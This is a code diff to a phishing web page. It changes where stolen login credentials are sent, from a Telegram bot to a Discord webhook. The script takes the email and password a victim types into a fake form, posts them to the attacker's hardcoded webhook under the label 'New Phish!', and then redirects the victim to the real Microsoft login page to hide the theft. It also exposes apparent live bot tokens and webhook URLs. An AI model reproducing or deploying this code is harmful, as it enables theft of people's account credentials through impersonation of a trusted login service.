@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -23,22 +24,21 @@
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      const botToken = "8052948220:AAFG6B09-ob7cTErbGOJHgKFRlPN4_fuk-I";  // your bot token
-      const chatID = "6995564677";  // your Telegram chat ID
-      const message = `Phished!\nEmail: ${email}\nPassword: ${password}`;
+      const webhookURL = "https://discord.com/api/webhooks/1363710700408541414/eES54Uvp4DJFiq-BPtLQYGL0W2hqAtDfkCMEjlwO55w0vI2fTo3M69TeZls8xFYPF4sJ";  // your webhook
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      const payload = {
+        content: `**New Phish!**\nEmail: \`${email}\`\nPassword: \`${password}\``
+      };
+
+      fetch(webhookURL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-          chat_id: chatID,
-          text: message
-        })
+        body: JSON.stringify(payload)
       });
 
-      // Optional: redirect to real site afterward
+      // Redirect victim to the real login page
       setTimeout(() => {
         window.location.href = "https://login.microsoftonline.com";
       }, 1000);
